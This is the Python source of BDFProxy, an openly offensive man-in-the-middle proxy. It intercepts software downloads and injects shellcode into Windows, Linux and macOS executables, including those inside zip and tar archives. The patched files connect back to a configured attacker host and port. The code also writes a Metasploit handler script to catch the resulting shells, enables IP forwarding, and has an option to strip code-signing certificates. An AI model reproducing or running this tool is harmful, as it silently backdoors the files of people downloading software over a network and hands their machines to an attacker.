#!/usr/bin/env python
"""
    BackdoorFactory Proxy (BDFProxy) v0.2 - 'Something Something'

    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com

    Copyright (c) 2013-2014, Joshua Pitts
    All rights reserved.

    Redistribution and use in source and binary forms, with or without modification,
    are permitted provided that the following conditions are met:

        1. Redistributions of source code must retain the above copyright notice,
        this list of conditions and the following disclaimer.

        2. Redistributions in binary form must reproduce the above copyright notice,
        this list of conditions and the following disclaimer in the documentation
        and/or other materials provided with the distribution.

        3. Neither the name of the copyright holder nor the names of its contributors
        may be used to endorse or promote products derived from this software without
        specific prior written permission.

    THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
    AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
    IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
    ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
    CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
    SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
    INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
    CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
    ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
    POSSIBILITY OF SUCH DAMAGE.

    Tested on Kali-Linux.

"""

from libmproxy import controller, proxy, platform
from libmproxy.proxy.server import ProxyServer
from tempfile import mkstemp
import os
from bdf import pebin
from bdf import elfbin
from bdf import machobin
import string
import random
import zipfile
import shutil
import sys
import pefile
import logging
import json
import tarfile
import tempfile


try:
    from configobj import ConfigObj
except:
    print '[!] Install conifgobj using your favorite python package manager!'


def writeResource(resourceFile, Values):
    with open(resourceFile, 'w') as f:
        f.write("#USAGE: msfconsole -r thisscriptname.rc\n\n\n")
        writeStatement0 = "use exploit/multi/handler\n"
        writeStatement4 = "set ExitOnSession false\n\n"
        writeStatement5 = "exploit -j -z\n\n"
        for aDictionary in Values:
            if isinstance(aDictionary, dict):
                if aDictionary != {}:
                    for key, value in aDictionary.items():
                        if key == 'MSFPAYLOAD':
                            writeStatement1 = 'set PAYLOAD ' + str(value) + "\n"
                        if key == "HOST":
                            writeStatement2 = 'set LHOST ' + str(value) + "\n"
                        if key == "PORT":
                            writeStatement3 = 'set LPORT ' + str(value) + "\n"
                    f.write(writeStatement0)
                    f.write(writeStatement1)
                    f.write(writeStatement2)
                    f.write(writeStatement3)
                    f.write(writeStatement4)
                    f.write(writeStatement5)


def dictParse(d):
    tmpValues = {}
    for key, value in d.iteritems():
        if isinstance(value, dict):
            dictParse(value)
        if key == 'HOST':
            tmpValues['HOST'] = value
        if key == 'PORT':
            tmpValues['PORT'] = value
        if key == 'MSFPAYLOAD':
            tmpValues['MSFPAYLOAD'] = value

    resourceValues.append(tmpValues)


class proxyMaster(controller.Master):

    def __init__(self, server):
        controller.Master.__init__(self, server)
        #FOR FUTURE USE
        self.binaryMimeTypes = (["application/octet-stream"], ['application/x-msdownload'],
                                ['application/x-msdos-program'], ['binary/octet-stream'],
                                )
        #FOR FUTURE USE
        self.zipMimeTypes = (['application/x-zip-compressed'], ['application/zip'])

        #USED NOW
        self.magicNumbers = {'elf': {'number': '7f454c46'.decode('hex'), 'offset': 0},
                             'pe': {'number': 'MZ', 'offset': 0},
                             'gz': {'number': '1f8b'.decode('hex'), 'offset': 0},
                             'bz': {'number': 'BZ', 'offset': 0},
                             'zip': {'number': '504b0304'.decode('hex'), 'offset': 0},
                             'tar': {'number': 'ustar', 'offset': 257},
                             'fatfile': {'number': 'cafebabe'.decode('hex'), 'offset': 0},
                             'machox64': {'number': 'cffaedfe'.decode('hex'), 'offset': 0},
                             'machox86': {'number': 'cefaedfe'.decode('hex'), 'offset': 0},
                             }

    def run(self):
        try:
            return controller.Master.run(self)
            logging.debug("Starting ")

        except KeyboardInterrupt:
            self.shutdown()

    def bytes_have_format(self, bytess, formatt):
        number = self.magicNumbers[formatt]
        if bytess[number['offset']:number['offset'] + len(number['number'])] == number['number']:
            return True
        return False

    def tar_files(self, aTarFileBytes, formatt):
        "When called will unpack and edit a Tar File and return a tar file"

        print "[*] TarFile size:", len(aTarFileBytes) / 1024, 'KB'

        if len(aTarFileBytes) > int(self.userConfig['TAR']['maxSize']):
            print "[!] TarFile over allowed size"
            logging.info("TarFIle maxSize met %s", len(aTarFileBytes))
            return aTarFileBytes

        with tempfile.NamedTemporaryFile() as tarFileStorage:
            tarFileStorage.write(aTarFileBytes)
            tarFileStorage.flush()

            if not tarfile.is_tarfile(tarFileStorage.name):
                print '[!] Not a tar file'
                return aTarFileBytes

            compressionMode = ':'
            if formatt == 'gz':
                compressionMode = ':gz'
            if formatt == 'bz':
                compressionMode = ':bz2'

            tarFile = None
            try:
                tarFileStorage.seek(0)
                tarFile = tarfile.open(fileobj=tarFileStorage, mode='r' + compressionMode)
            except tarfile.ReadError:
                pass

            if tarFile is None:
                print '[!] Not a tar file'
                return aTarFileBytes

            print '[*] Tar file contents and info:'
            print '[*] Compression:', formatt

            members = tarFile.getmembers()
            for info in members:
                print "\t", info.name, info.mtime, info.size

            newTarFileStorage = tempfile.NamedTemporaryFile()
            newTarFile = tarfile.open(mode='w' + compressionMode, fileobj=newTarFileStorage)

            patchCount = 0
            wasPatched = False

            for info in members:
                print "[*] >>> Next file in tarfile:", info.name

                if not info.isfile():
                    print info.name, 'is not a file'
                    newTarFile.addfile(info, tarFile.extractfile(info))
                    continue

                if info.size >= long(self.FileSizeMax):
                    print info.name, 'is too big'
                    newTarFile.addfile(info, tarFile.extractfile(info))
                    continue

                # Check against keywords
                keywordCheck = False

                if type(self.tarblacklist) is str:
                    if self.tarblacklist.lower() in info.name.lower():
                        keywordCheck = True

                else:
                    for keyword in self.tarblacklist:
                        if keyword.lower() in info.name.lower():
                            keywordCheck = True
                            continue

                if keywordCheck is True:
                    print "[!] Tar blacklist enforced!"
                    logging.info('Tar blacklist enforced on %s', info.name)
                    continue

                # Try to patch
                extractedFile = tarFile.extractfile(info)

                if patchCount >= int(self.userConfig['TAR']['patchCount']):
                    newTarFile.addfile(info, extractedFile)
                else:
                    # create the file on disk temporarily for fileGrinder to run on it
                    with tempfile.NamedTemporaryFile() as tmp:
                        shutil.copyfileobj(extractedFile, tmp)
                        tmp.flush()
                        patchResult = self.binaryGrinder(tmp.name)
                        if patchResult:
                            patchCount += 1
                            file2 = "backdoored/" + os.path.basename(tmp.name)
                            print "[*] Patching complete, adding to tar file."
                            info.size = os.stat(file2).st_size
                            with open(file2, 'rb') as f:
                                newTarFile.addfile(info, f)
                            logging.info("%s in tar patched, adding to tarfile", info.name)
                            os.remove(file2)
                            wasPatched = True
                        else:
                            print "[!] Patching failed"
                            with open(tmp.name, 'rb') as f:
                                newTarFile.addfile(info, f)
                            logging.info("%s patching failed. Keeping original file in tar.", info.name)
                if patchCount == int(self.userConfig['TAR']['patchCount']):
                    logging.info("Met Tar config patchCount limit.")

            # finalize the writing of the tar file first
            newTarFile.close()

            # then read the new tar file into memory
            newTarFileStorage.seek(0)
            ret = newTarFileStorage.read()
            newTarFileStorage.close()  # it's automatically deleted

            if wasPatched is False:
                # If nothing was changed return the original
                print "[*] No files were patched forwarding original file"
                return aTarFileBytes
            else:
                return ret

    def zip_files(self, aZipFile):
        "When called will unpack and edit a Zip File and return a zip file"

        print "[*] ZipFile size:", len(aZipFile) / 1024, 'KB'

        if len(aZipFile) > int(self.userConfig['ZIP']['maxSize']):
            print "[!] ZipFile over allowed size"
            logging.info("ZipFIle maxSize met %s", len(aZipFile))
            return aZipFile

        tmpRan = ''.join(random.choice(string.ascii_lowercase + string.digits + string.ascii_uppercase) for _ in range(8))
        tmpDir = '/tmp/' + tmpRan
        tmpFile = '/tmp/' + tmpRan + '.zip'

        os.mkdir(tmpDir)

        with open(tmpFile, 'w') as f:
            f.write(aZipFile)

        zippyfile = zipfile.ZipFile(tmpFile, 'r')

        #encryption test
        try:
            zippyfile.testzip()

        except RuntimeError as e:
            if 'encrypted' in str(e):
                logging.info('Encrypted zipfile found. Not patching.')
                return aZipFile

        print "[*] ZipFile contents and info:"

        for info in zippyfile.infolist():
            print "\t", info.filename, info.date_time, info.file_size

        zippyfile.extractall(tmpDir)

        patchCount = 0

        wasPatched = False

        for info in zippyfile.infolist():
            print "[*] >>> Next file in zipfile:", info.filename

            if os.path.isdir(tmpDir + '/' + info.filename) is True:
                print info.filename, 'is a directory'
                continue

            #Check against keywords
            keywordCheck = False

            if type(self.zipblacklist) is str:
                if self.zipblacklist.lower() in info.filename.lower():
                    keywordCheck = True

            else:
                for keyword in self.zipblacklist:
                    if keyword.lower() in info.filename.lower():
                        keywordCheck = True
                        continue

            if keywordCheck is True:
                print "[!] Zip blacklist enforced!"
                logging.info('Zip blacklist enforced on %s', info.filename)
                continue

            patchResult = self.binaryGrinder(tmpDir + '/' + info.filename)

            if patchResult:
                patchCount += 1
                file2 = "backdoored/" + os.path.basename(info.filename)
                print "[*] Patching complete, adding to zip file."
                shutil.copyfile(file2, tmpDir + '/' + info.filename)
                logging.info("%s in zip patched, adding to zipfile", info.filename)
                os.remove(file2)
                wasPatched = True
            else:
                print "[!] Patching failed"
                logging.info("%s patching failed. Keeping original file in zip.", info.filename)

            print '-' * 10

            if patchCount >= int(self.userConfig['ZIP']['patchCount']):  # Make this a setting.
                logging.info("Met Zip config patchCount limit.")
                break

        zippyfile.close()

        zipResult = zipfile.ZipFile(tmpFile, 'w', zipfile.ZIP_DEFLATED)

        print "[*] Writing to zipfile:", tmpFile

        for base, dirs, files in os.walk(tmpDir):
            for afile in files:
                    filename = os.path.join(base, afile)
                    print '[*] Writing filename to zipfile:', filename.replace(tmpDir + '/', '')
                    zipResult.write(filename, arcname=filename.replace(tmpDir + '/', ''))

        zipResult.close()
        #clean up
        shutil.rmtree(tmpDir)

        with open(tmpFile, 'rb') as f:
            tempZipFile = f.read()
        os.remove(tmpFile)

        if wasPatched is False:
            print "[*] No files were patched forwarding original file"
            return aZipFile
        else:
            return tempZipFile

    def convert_to_Bool(self, aString):
        if aString.lower() == 'true':
            return True
        elif aString.lower() == 'false':
            return False
        elif aString.lower() == 'none':
            return None

    def binaryGrinder(self, binaryFile):
        """
        Feed potential binaries into this function,
        it will return the result PatchedBinary, False, or None
        """

        with open(binaryFile, 'r+b') as f:
            binaryTMPHandle = f.read()

        binaryHeader = binaryTMPHandle[:4]
        result = None

        try:
            if binaryHeader[:2] == 'MZ':  # PE/COFF
                pe = pefile.PE(data=binaryTMPHandle, fast_load=True)
                magic = pe.OPTIONAL_HEADER.Magic
                machineType = pe.FILE_HEADER.Machine

                #update when supporting more than one arch
                if (magic == int('20B', 16) and machineType == 0x8664 and
                   self.WindowsType.lower() in ['all', 'x64']):
                        add_section = False
                        cave_jumping = False
                        if self.WindowsIntelx64['PATCH_TYPE'].lower() == 'append':
                            add_section = True
                        elif self.WindowsIntelx64['PATCH_TYPE'].lower() == 'jump':
                            cave_jumping = True

                        # if automatic override
                        if self.WindowsIntelx64['PATCH_METHOD'].lower() == 'automatic':
                            cave_jumping = True

                        targetFile = pebin.pebin(FILE=binaryFile,
                                                 OUTPUT=os.path.basename(binaryFile),
                                                 SHELL=self.WindowsIntelx64['SHELL'],
                                                 HOST=self.WindowsIntelx64['HOST'],
                                                 PORT=int(self.WindowsIntelx64['PORT']),
                                                 ADD_SECTION=add_section,
                                                 CAVE_JUMPING=cave_jumping,
                                                 IMAGE_TYPE=self.WindowsType,
                                                 PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx64['PATCH_DLL']),
                                                 SUPPLIED_SHELLCODE=self.WindowsIntelx64['SUPPLIED_SHELLCODE'],
                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx64['ZERO_CERT']),
                                                 PATCH_METHOD=self.WindowsIntelx64['PATCH_METHOD'].lower()
                                                 )

                        result = targetFile.run_this()

                elif (machineType == 0x14c and
                      self.WindowsType.lower() in ['all', 'x86']):
                        add_section = False
                        cave_jumping = False
                        #add_section wins for cave_jumping
                        #default is single for BDF
                        if self.WindowsIntelx86['PATCH_TYPE'].lower() == 'append':
                            add_section = True
                        elif self.WindowsIntelx86['PATCH_TYPE'].lower() == 'jump':
                            cave_jumping = True

                        # if automatic override
                        if self.WindowsIntelx86['PATCH_METHOD'].lower() == 'automatic':
                            cave_jumping = True

                        targetFile = pebin.pebin(FILE=binaryFile,
                                                 OUTPUT=os.path.basename(binaryFile),
                                                 SHELL=self.WindowsIntelx86['SHELL'],
                                                 HOST=self.WindowsIntelx86['HOST'],
                                                 PORT=int(self.WindowsIntelx86['PORT']),
                                                 ADD_SECTION=add_section,
                                                 CAVE_JUMPING=cave_jumping,
                                                 IMAGE_TYPE=self.WindowsType,
                                                 PATCH_DLL=self.convert_to_Bool(self.WindowsIntelx86['PATCH_DLL']),
                                                 SUPPLIED_SHELLCODE=self.WindowsIntelx86['SUPPLIED_SHELLCODE'],
                                                 ZERO_CERT=self.convert_to_Bool(self.WindowsIntelx86['ZERO_CERT']),
                                                 PATCH_METHOD=self.WindowsIntelx86['PATCH_METHOD'].lower()
                                                 )

                        result = targetFile.run_this()

            elif binaryHeader[:4].encode('hex') == '7f454c46':  # ELF

                targetFile = elfbin.elfbin(FILE=binaryFile, SUPPORT_CHECK=False)
                targetFile.support_check()

                if targetFile.class_type == 0x1:
                    #x86CPU Type
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx86['SHELL'],
                                               HOST=self.LinuxIntelx86['HOST'],
                                               PORT=int(self.LinuxIntelx86['PORT']),
                                               SUPPLIED_SHELLCODE=self.LinuxIntelx86['SUPPLIED_SHELLCODE'],
                                               IMAGE_TYPE=self.LinuxType
                                               )
                    result = targetFile.run_this()
                elif targetFile.class_type == 0x2:
                    #x64
                    targetFile = elfbin.elfbin(FILE=binaryFile,
                                               OUTPUT=os.path.basename(binaryFile),
                                               SHELL=self.LinuxIntelx64['SHELL'],
                                               HOST=self.LinuxIntelx64['HOST'],
                                               PORT=int(self.LinuxIntelx64['PORT']),
                                               SUPPLIED_SHELLCODE=self.LinuxIntelx64['SUPPLIED_SHELLCODE'],
                                               IMAGE_TYPE=self.LinuxType
                                               )
                    result = targetFile.run_this()

            elif binaryHeader[:4].encode('hex') in ['cefaedfe', 'cffaedfe', 'cafebabe']:  # Macho
                targetFile = machobin.machobin(FILE=binaryFile, SUPPORT_CHECK=False)
                targetFile.support_check()

                #ONE CHIP SET MUST HAVE PRIORITY in FAT FILE

                if targetFile.FAT_FILE is True:
                    if self.FatPriority == 'x86':
                        targetFile = machobin.machobin(FILE=binaryFile,
                                                       OUTPUT=os.path.basename(binaryFile),
                                                       SHELL=self.MachoIntelx86['SHELL'],
                                                       HOST=self.MachoIntelx86['HOST'],
                                                       PORT=int(self.MachoIntelx86['PORT']),
                                                       SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
                                                       FAT_PRIORITY=self.FatPriority
                                                       )
                        result = targetFile.run_this()

                    elif self.FatPriority == 'x64':
                        targetFile = machobin.machobin(FILE=binaryFile,
                                                       OUTPUT=os.path.basename(binaryFile),
                                                       SHELL=self.MachoIntelx64['SHELL'],
                                                       HOST=self.MachoIntelx64['HOST'],
                                                       PORT=int(self.MachoIntelx64['PORT']),
                                                       SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
                                                       FAT_PRIORITY=self.FatPriority
                                                       )
                        result = targetFile.run_this()

                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x7':
                    targetFile = machobin.machobin(FILE=binaryFile,
                                                   OUTPUT=os.path.basename(binaryFile),
                                                   SHELL=self.MachoIntelx86['SHELL'],
                                                   HOST=self.MachoIntelx86['HOST'],
                                                   PORT=int(self.MachoIntelx86['PORT']),
                                                   SUPPLIED_SHELLCODE=self.MachoIntelx86['SUPPLIED_SHELLCODE'],
                                                   FAT_PRIORITY=self.FatPriority
                                                   )
                    result = targetFile.run_this()

                elif targetFile.mach_hdrs[0]['CPU Type'] == '0x1000007':
                    targetFile = machobin.machobin(FILE=binaryFile,
                                                   OUTPUT=os.path.basename(binaryFile),
                                                   SHELL=self.MachoIntelx64['SHELL'],
                                                   HOST=self.MachoIntelx64['HOST'],
                                                   PORT=int(self.MachoIntelx64['PORT']),
                                                   SUPPLIED_SHELLCODE=self.MachoIntelx64['SUPPLIED_SHELLCODE'],
                                                   FAT_PRIORITY=self.FatPriority
                                                   )
                    result = targetFile.run_this()

            return result

        except Exception as e:
            print 'Exception', str(e)
            logging.warning("EXCEPTION IN binaryGrinder %s", str(e))
            return None

    def hosts_whitelist_check(self, flow):
        if self.hostwhitelist.lower() == 'all':
            self.patchIT = True

        elif type(self.hostwhitelist) is str:
            if self.hostwhitelist.lower() in flow.request.host.lower():
                self.patchIT = True
                logging.info("Host whitelist hit: %s, HOST: %s ",
                             str(self.hostwhitelist),
                             str(flow.request.host),
                             )

        elif flow.request.host.lower() in self.hostwhitelist.lower():
            self.patchIT = True
            logging.info("Host whitelist hit: %s, HOST: %s ",
                         str(self.hostwhitelist),
                         str(flow.request.host),
                         )

        else:
            for keyword in self.hostwhitelist:
                if keyword.lower() in flow.requeset.host.lower():
                    self.patchIT = True
                    logging.info("Host whitelist hit: %s, HOST: %s ",
                                 str(self.hostwhitelist),
                                 str(flow.request.host),
                                 )
                    break

    def keys_whitelist_check(self, flow):
        #Host whitelist check takes precedence
        if self.patchIT is False:
            return None

        if self.keyswhitelist.lower() == 'all':
            self.patchIT = True

        elif type(self.keyswhitelist) is str:
            if self.keyswhitelist.lower() in flow.request.path.lower():
                self.patchIT = True
                logging.info("Keyword whitelist hit: %s, PATH: %s",
                             str(self.keyswhitelist), str(flow.request.path))

        elif flow.request.host.lower() in [x.lower() for x in self.keyswhitelist]:
            self.patchIT = True
            logging.info("Keyword whitelist hit: %s, PATH: %s",
                         str(self.keyswhitelist), str(flow.request.path))

        else:

            for keyword in self.keyswhitelist:
                if keyword.lower() in flow.requeset.path.lower():
                    self.patchIT = True
                    logging.info("Keyword whitelist hit: %s, PATH: %s",
                                 str(self.keyswhitelist), str(flow.request.path))
                    break

    def keys_backlist_check(self, flow):
        if type(self.keysblacklist) is str:

            if self.keysblacklist.lower() in flow.request.path.lower():
                self.patchIT = False
                logging.info("Keyword blacklist hit: %s, PATH: %s",
                             str(self.keysblacklist), str(flow.request.path))

        else:
            for keyword in self.keysblacklist:
                if keyword.lower() in flow.request.path.lower():
                    self.patchIT = False
                    logging.info("Keyword blacklist hit: %s, PATH: %s",
                                 str(self.keysblacklist), str(flow.request.path))
                    break

    def hosts_blacklist_check(self, flow):
        if type(self.hostblacklist) is str:

            if self.hostblacklist.lower() in flow.request.host.lower(): 
                self.patchIT = False
                logging.info("Host Blacklist hit: %s : HOST: %s ",
                             str(self.hostblacklist), str(flow.request.host))

        elif flow.request.host.lower() in [x.lower() for x in self.hostblacklist]:
            self.patchIT = False
            logging.info("Host Blacklist hit: %s : HOST: %s ",
                         str(self.hostblacklist), str(flow.request.host))

        else:
            for host in self.hostblacklist:
                if host.lower() in flow.request.host.lower():
                    self.patchIT = False
                    logging.info("Host Blacklist hit: %s : HOST: %s ",
                                 str(self.hostblacklist), str(flow.request.host))
                    break

    def parse_target_config(self, targetConfig):
        for key, value in targetConfig.items():
            if hasattr(self, key) is False:
                setattr(self, key, value)
                logging.debug("Settings Config %s: %s", key, value)

            elif getattr(self, key, value) != value:

                if value == "None":
                    continue

                #test if string can be easily converted to dict
                if ':' in str(value):
                    for tmpkey, tmpvalue in dict(value).items():
                        getattr(self, key, value)[tmpkey] = tmpvalue
                        logging.debug("Updating Config %s: %s", tmpkey, tmpvalue)

                else:
                    setattr(self, key, value)
                    logging.debug("Updating Config %s: %s", key, value)

    def handle_request(self, flow):
        print "*" * 10, "REQUEST", "*" * 10
        print "[*] HOST: ", flow.request.host
        print "[*] PATH: ", flow.request.path
        flow.reply()
        print "*" * 10, "END REQUEST", "*" * 10

    def handle_response(self, flow):
        #Read config here for dynamic updating
        
        try:
            self.userConfig = ConfigObj('bdfproxy.cfg')
            self.hostblacklist = self.userConfig['hosts']['blacklist']
            self.hostwhitelist = self.userConfig['hosts']['whitelist']
            self.keysblacklist = self.userConfig['keywords']['blacklist']
            self.keyswhitelist = self.userConfig['keywords']['whitelist']
            self.zipblacklist = self.userConfig['ZIP']['blacklist']
            self.tarblacklist = self.userConfig['TAR']['blacklist']

            for target in self.userConfig['targets'].keys():
                if target == 'ALL':
                    self.parse_target_config(self.userConfig['targets']['ALL'])

                if target in flow.request.host: 
                    self.parse_target_config(self.userConfig['targets'][target])
                
        except Exception as e:
            print "[!] YOUR CONFIG IS BROKEN:", str(e)
            logging.warning("[!] YOUR CONFIG IS BROKEN %s", str(e))

        print "=" * 10, "RESPONSE", "=" * 10

        print "[*] HOST: ", flow.request.host
        print "[*] PATH: ", flow.request.path

        # Below are gates from whitelist --> blacklist
        # Blacklists have the final say, but everything starts off as not patchable
        #  until a rule says True. Host whitelist over rides keyword whitelist.

        self.patchIT = False

        self.hosts_whitelist_check(flow)

        self.keys_whitelist_check(flow)

        self.keys_backlist_check(flow)

        self.hosts_blacklist_check(flow)

        if 'content-length' in flow.request.headers.keys():
            if int(flow.request.headers['content-length'][0]) >= long(self.FileSizeMax):
                print "[!] Not patching over content-length, forwarding to user"
                logging.info("Over FileSizeMax setting %s : %s", flow.request.host, flow.request.path)
                self.patchIT = False

        if self.patchIT is False:
            print '[!] Not patching, flow did not make it through config settings'
            logging.info("Config did not allow the patching of HOST: %s, PATH: %s",
                         flow.request.host, flow.request.path)

            flow.reply()

        else:
            if self.bytes_have_format(flow.reply.obj.response.content, 'zip') and self.convert_to_Bool(self.CompressedFiles) is True:
                    aZipFile = flow.reply.obj.response.content
                    flow.reply.obj.response.content = self.zip_files(aZipFile)

            elif self.bytes_have_format(flow.reply.obj.response.content, 'pe') or self.bytes_have_format(flow.reply.obj.response.content, 'elf') or \
                self.bytes_have_format(flow.reply.obj.response.content, 'fatfile') or self.bytes_have_format(flow.reply.obj.response.content, 'machox86') or \
                self.bytes_have_format(flow.reply.obj.response.content, 'machox64'):             

                orgFile = flow.reply.obj.response.content

                fd, tmpFile = mkstemp()

                with open(tmpFile, 'w') as f:
                    f.write(orgFile)

                patchResult = self.binaryGrinder(tmpFile)

                if patchResult:
                    file2 = open("backdoored/" + os.path.basename(tmpFile), "rb").read()
                    flow.reply.obj.response.content = file2
                    os.remove('./backdoored/' + os.path.basename(tmpFile))
                    print "[*] Patching complete, forwarding to user."
                    logging.info("Patching complete for HOST: %s, PATH: %s", flow.request.host, flow.request.path)
                else:
                    print "[!] Patching failed"
                    logging.info("Patching failed for HOST: %s, PATH: %s", flow.request.host, flow.request.path)

                os.close(fd)

                os.remove(tmpFile)

            elif self.bytes_have_format(flow.reply.obj.response.content, 'gz') and self.convert_to_Bool(self.CompressedFiles) is True:
                # assume .tar.gz for now
                flow.reply.obj.response.content = self.tar_files(flow.reply.obj.response.content, 'gz')
            elif self.bytes_have_format(flow.reply.obj.response.content, 'bz') and self.convert_to_Bool(self.CompressedFiles) is True:
                # assume .tar.bz for now
                flow.reply.obj.response.content = self.tar_files(flow.reply.obj.response.content, 'bz')
            elif self.bytes_have_format(flow.reply.obj.response.content, 'tar') and self.convert_to_Bool(self.CompressedFiles) is True:
                flow.reply.obj.response.content = self.tar_files(flow.reply.obj.response.content, 'tar')

            flow.reply()

        print "=" * 10, "END RESPONSE", "=" * 10


#Intial CONFIG reading
userConfig = ConfigObj('bdfproxy.cfg')

#################### BEGIN OVERALL CONFIGS ############################
#DOES NOT UPDATE ON THE FLY
resourceScript = userConfig['Overall']['resourceScript']

config = proxy.ProxyConfig(clientcerts=os.path.expanduser(userConfig['Overall']['certLocation']),
                           body_size_limit=int(userConfig['Overall']['MaxSizeFileRequested']),
                           port=int(userConfig['Overall']['proxyPort']),
                           mode=userConfig['Overall']['transparentProxy'],
                           )

if userConfig['Overall']['transparentProxy'] != "None":
    config.transparent_proxy = {'sslports': userConfig['Overall']['sslports'],
                                'resolver': platform.resolver()
                                }

server = ProxyServer(config)

numericLogLevel = getattr(logging, userConfig['Overall']['loglevel'].upper(), None)

if not isinstance(numericLogLevel, int):
    raise ValueError("o_O: INFO, DEBUG, WARNING, ERROR, CRITICAL for loglevel in conifg")
    sys.exit()

logging.basicConfig(filename=userConfig['Overall']['logname'],
                    level=numericLogLevel,
                    format='%(asctime)s %(message)s'
                    )

#################### END OVERALL CONFIGS ##############################

#Write resource script
print "[!] Writing resource script."
resourceValues = []
dictParse(userConfig['targets'])
writeResource(str(resourceScript), resourceValues)
print "[!] Resource writen to %s" % str(resourceScript)

#configuring forwarding
try:
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
except Exception as e:
    print str(e)

m = proxyMaster(server)
print "[!] Starting BDFProxy"
print "[!] Author: @midnite_runr | the[.]midnite).(runr<at>gmail|.|com"
print "[!] IRC: freenode #BDFactory"
logging.info("################ Starting BDFProxy ################")

logging.info("[!] ConfigDump %s", json.dumps(userConfig, sort_keys=True, indent=4))

m.run()
